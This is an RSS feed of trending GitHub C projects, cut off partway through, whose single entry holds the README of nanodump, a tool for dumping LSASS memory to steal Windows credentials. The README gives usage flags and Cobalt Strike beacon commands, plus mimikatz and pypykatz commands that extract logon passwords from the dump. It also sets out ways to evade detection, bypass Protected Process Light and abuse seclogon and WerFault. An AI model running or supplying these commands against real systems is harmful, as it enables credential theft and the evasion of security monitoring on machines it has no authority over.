<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-05-02T01:31:59Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>fortra/nanodump</title>
    <updated>2023-05-02T01:31:59Z</updated>
    <id>tag:github.com,2023-05-02:/fortra/nanodump</id>
    <link href="https://github.com/fortra/nanodump" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The swiss army knife of LSASS dumping&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;NanoDump&lt;/h1&gt; &#xA;&lt;p&gt;A flexible tool that creates a minidump of the LSASS process.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/fortra/nanodump/main/resources/demo.png&#34; alt=&#34;screenshot&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Table of contents&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fortra/nanodump/main/#usage&#34;&gt;Usage&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fortra/nanodump/main/#features&#34;&gt;Features&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fortra/nanodump/main/#combinations&#34;&gt;Combining techniques&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fortra/nanodump/main/#examples&#34;&gt;Examples&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/fortra/nanodump/main/#redirectors&#34;&gt;HTTPS redirectors&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2 id=&#34;usage&#34;&gt;1. Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;usage: Z:\nanodump.x64.exe [--write C:\Windows\Temp\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\Windows\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\Windows\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]&#xA;Dumpfile options:&#xA;    --write DUMP_PATH, -w DUMP_PATH&#xA;            filename of the dump&#xA;    --valid, -v&#xA;            create a dump with a valid signature&#xA;Obtain an LSASS handle via:&#xA;    --duplicate, -d&#xA;            duplicate a high privileged existing LSASS handle&#xA;    --duplicate-elevate, -de&#xA;            duplicate a low privileged existing LSASS handle and then elevate it&#xA;    --seclogon-leak-local, -sll&#xA;            leak an LSASS handle into nanodump via seclogon&#xA;    --seclogon-leak-remote BIN_PATH, -slt BIN_PATH&#xA;            leak an LSASS handle into another process via seclogon and duplicate it&#xA;    --seclogon-duplicate, -sd&#xA;            make seclogon open a handle to LSASS and duplicate it&#xA;    --spoof-callstack {svchost,wmi,rpc}, -sc {svchost,wmi,rpc}&#xA;            open a handle to LSASS using a fake calling stack&#xA;Let WerFault.exe (instead of nanodump) create the dump&#xA;    --silent-process-exit DUMP_FOLDER, -spe DUMP_FOLDER&#xA;            force WerFault.exe to dump LSASS via SilentProcessExit&#xA;    --shtinkering, -sk&#xA;            force WerFault.exe to dump LSASS via Shtinkering&#xA;Avoid reading LSASS directly:&#xA;    --fork, -f&#xA;            fork the target process before dumping&#xA;    --snapshot, -s&#xA;            snapshot the target process before dumping&#xA;Avoid opening a handle with high privileges:&#xA;    --elevate-handle, -eh&#xA;            open a handle to LSASS with low privileges and duplicate it to gain higher privileges&#xA;Miscellaneous:&#xA;    --getpid&#xA;            print the PID of LSASS and leave&#xA;Help:&#xA;    --help, -h&#xA;            print this help message and leave&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Clone&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/helpsystems/nanodump.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Compile (optional)&lt;/h3&gt; &#xA;&lt;p&gt;&lt;b&gt;On Linux with MinGW&lt;/b&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;make -f Makefile.mingw&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;b&gt;On Windows with MSVC&lt;/b&gt; (No BOF support)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nmake -f Makefile.msvc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Import (CobaltStrike only)&lt;/h3&gt; &#xA;&lt;p&gt;Import the &lt;code&gt;NanoDump.cna&lt;/code&gt; script on Cobalt Strike.&lt;/p&gt; &#xA;&lt;h3&gt;Run&lt;/h3&gt; &#xA;&lt;p&gt;Run the &lt;code&gt;nanodump&lt;/code&gt; command in the Beacon console or the &lt;code&gt;nanodump.x64.exe&lt;/code&gt; binary.&lt;/p&gt; &#xA;&lt;h3&gt;Restore the signature&lt;/h3&gt; &#xA;&lt;p&gt;If you didn&#39;t specify the &lt;code&gt;--valid&lt;/code&gt; flag, you need to restore the invalid signature&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-zsh&#34;&gt;scripts/restore_signature &amp;lt;dumpfile&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Get the secretz&lt;/h3&gt; &#xA;&lt;p&gt;&lt;b&gt;mimikatz:&lt;/b&gt;&lt;br&gt; To get the secrets simply run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;mimikatz.exe &#34;sekurlsa::minidump &amp;lt;dumpfile&amp;gt;&#34; &#34;sekurlsa::logonPasswords full&#34; exit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;b&gt;pypykatz:&lt;/b&gt;&lt;br&gt; If you prefer to stay on linux, you can use the python3 port of mimikatz called &lt;a href=&#34;https://github.com/skelsec/pypykatz&#34;&gt;pypykatz&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;python3 -m pypykatz lsa minidump &amp;lt;dumpfie&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2 id=&#34;features&#34;&gt;2. Features&lt;/h2&gt; &#xA;&lt;h3&gt;Process forking&lt;/h3&gt; &#xA;&lt;p&gt;To avoid opening a handle to LSASS with &lt;code&gt;PROCESS_VM_READ&lt;/code&gt;, you can use the &lt;code&gt;--fork&lt;/code&gt; parameter.&lt;br&gt; This will make nanodump create a handle to LSASS with &lt;code&gt;PROCESS_CREATE_PROCESS&lt;/code&gt; access and then create a &#39;clone&#39; of the process. This new process will then be dumped. While this will result in a process creation and deletion, it removes the need to read LSASS directly.&lt;/p&gt; &#xA;&lt;h3&gt;Snapshot&lt;/h3&gt; &#xA;&lt;p&gt;Similarly to the &lt;code&gt;--fork&lt;/code&gt; option, you can use &lt;code&gt;--snapshot&lt;/code&gt; to create a snapshot of the LSASS process.&lt;br&gt; This will make nanodump create a handle to LSASS with &lt;code&gt;PROCESS_CREATE_PROCESS&lt;/code&gt; access and then create a snapshot of the process using &lt;code&gt;PssNtCaptureSnapshot&lt;/code&gt;. This new process will then be dumped. The snapshot will be freed automatically upon completion.&lt;/p&gt; &#xA;&lt;h3&gt;Handle duplication&lt;/h3&gt; &#xA;&lt;p&gt;As opening a handle to LSASS can be detected, nanodump can instead search for existing handles to LSASS.&lt;br&gt; If one is found, it will copy it and use it to create the minidump.&lt;br&gt; Note that it is not guaranteed to find such handle.&lt;/p&gt; &#xA;&lt;h3&gt;Elevate handle&lt;/h3&gt; &#xA;&lt;p&gt;You can obtaina handle to LSASS with PROCESS_QUERY_LIMITED_INFORMATION, which is likely to be whitelisted, and then elevate that handle by duplicating it.&lt;/p&gt; &#xA;&lt;h3&gt;Seclogon handle leak local&lt;/h3&gt; &#xA;&lt;p&gt;To avoid opening a handle to LSASS, you can use abuse the seclogon service by calling &lt;code&gt;CreateProcessWithLogonW&lt;/code&gt; to leak an LSASS handle into the nanodump binary.&lt;br&gt; To enable this feature, use the &lt;code&gt;--seclogon-leak-local&lt;/code&gt; parameter.&lt;br&gt; Take into account that when used from Cobalt Strike, an unsigned nanodump binary needs to be written to disk to use this feature.&lt;/p&gt; &#xA;&lt;h3&gt;Seclogon handle leak remote&lt;/h3&gt; &#xA;&lt;p&gt;This technique is very similar to the previous one, but instead of leaking the handle into nanodump, it is leaked into another binary and then duplicated so that nanodump can used it. Use the &lt;code&gt;--seclogon-leak-remote&lt;/code&gt; flag to access this functionality.&lt;/p&gt; &#xA;&lt;h3&gt;Seclogon handle duplication&lt;/h3&gt; &#xA;&lt;p&gt;You can trick the seclogon process to open a handle to LSASS and duplicate it before it is closed, by winning a race condition using file locks. Use the &lt;code&gt;--seclogon-duplicate&lt;/code&gt; flag to access this functionality.&lt;/p&gt; &#xA;&lt;h3&gt;Load nanodump as an SSP&lt;/h3&gt; &#xA;&lt;p&gt;You can load nanodump as an SSP in LSASS to avoid opening a handle.&lt;br&gt; When the DLL has been loaded into LSASS, the parameters will be passed via a named pipe and once the dump is completed, &lt;code&gt;DllMain&lt;/code&gt; will return FALSE to make LSASS unload the nanodump DLL.&lt;br&gt; You can hardcode the parameters into the DLL and avoid using the named pipe altogether with the compiler flag &lt;code&gt;PASS_PARAMS_VIA_NAMED_PIPES=0&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;Upload and load a nanodump DLL&lt;/h4&gt; &#xA;&lt;p&gt;By default, an unsigned nanodump DLL will be uploaded to the Temp folder which will be deleted automatically.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump_ssp -v -w C:\Windows\Temp\lsass.dmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you want to load a pre-existing DLL, you can run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump_ssp -v -w C:\Windows\Temp\lsass.dmp --load-dll C:\Windows\Temp\ssp.dll&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;PPL Dump exploit&lt;/h3&gt; If LSASS is running as Protected Process Light (PPL), you can try to bypass it using a userland exploit discovered by Project Zero. If it is successful, the dump will be written to disk. &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Note that this vulnerability has been fixed in the July 2022 update pack (Windows 10 21H2 Build 19044.1826)&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;To access this feature, use the &lt;code&gt;nanodump_ppl_dump&lt;/code&gt; command&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump_ppl_dump -v -w C:\Windows\Temp\lsass.dmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;PPL Medic exploit&lt;/h3&gt; Nanodump also implements the PPLMedic exploit, which works on systems that have the July 2022 update pack. The parameters will be passed to the nanodump DLL via a named pipe. You can hardcode the parameters into the DLL and avoid using the named pipe altogether with the compiler flag PASS_PARAMS_VIA_NAMED_PIPES=0. &#xA;&lt;p&gt;To access this feature, use the &lt;code&gt;nanodump_ppl_medic&lt;/code&gt; command&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump_ppl_medic -v -w C:\Windows\Temp\lsass.dmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;WerFault&lt;/h3&gt; You can force the WerFault.exe process to create a full memory dump of LSASS. Take into consideration that this requires to write to the registry &#xA;&lt;p&gt;Because the dump is not made by nanodump, it will always have a valid signature.&lt;/p&gt; &#xA;&lt;h4&gt;Silent Process Exit&lt;/h4&gt; &#xA;&lt;p&gt;To leverage the Silent Process Exit technique, use the &lt;code&gt;--silent-process-exit&lt;/code&gt; parameter and the path there the dump should be created.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --silent-process-exit C:\Windows\Temp\&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;A dump of the nanodump process will also be created, similar to this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; dir &#39;C:\Windows\Temp\lsass.exe-(PID-648)-4035593\&#39;&#xA;&#xA;Directory: C:\Windows\Temp\lsass.exe-(PID-648)-4035593&#xA;&#xA;Mode                 LastWriteTime         Length Name&#xA;----                 -------------         ------ ----&#xA;-a----         6/23/2022   7:40 AM       58830409 lsass.exe-(PID-648).dmp&#xA;-a----         6/23/2022   7:40 AM        7862825 nanodump.x64.exe-(PID-3224).dmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Shtinkering&lt;/h4&gt; &#xA;&lt;p&gt;You can also use the Shtinkering technique, which requires nanodump to run under SYSTEM.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;beacon&amp;gt; nanodump --shtinkering&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The dump will tipically be created under &lt;code&gt;C:\Windows\system32\config\systemprofile\AppData\Local\CrashDumps&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Spoof the callstack&lt;/h3&gt; &#xA;&lt;p&gt;You can open a handle to LSASS with a fake callstack, this makes the function call look a bit more legitimate.&lt;br&gt; The offsets used in this feature, are only valid for Windows 10.0.19044.1706 (21h2), in other versions, the callstack might not look as expected. You can spoof the callstack of svchost, wmi and rpc.&lt;br&gt; To access this feature, use the paramter &lt;code&gt;--spoof-callstack&lt;/code&gt; with the values &lt;code&gt;svchost&lt;/code&gt;, &lt;code&gt;wmi&lt;/code&gt; or &lt;code&gt;rpc&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2 id=&#34;combinations&#34;&gt;3. Combining techniques&lt;/h2&gt; &#xA;&lt;p&gt;You can combine many techniques to customize how nanodump operates.&lt;br&gt; The following table indicates which flags can be used together.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;--write&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;--valid&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;--duplicate&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;--elevate-handle&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;--duplicate-elevate&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;--seclogon-leak-local&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;--seclogon-leak-remote&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;--seclogon-duplicate&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;--spoof-callstack&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;--silent-process-exit&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;--shtinkering&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;--fork&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;--snapshot&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;SSP&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;PPL_DUMP&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;PPL_MEDIC&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;--write&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;--valid&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;--duplicate&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;--elevate-handle&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;--duplicate-elevate&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;--seclogon-leak-local&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;--seclogon-leak-remote&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;--seclogon-duplicate&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;--spoof-callstack&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;--silent-process-exit&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;--shtinkering&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;✓&lt;/td&gt; &#xA;   &lt;td 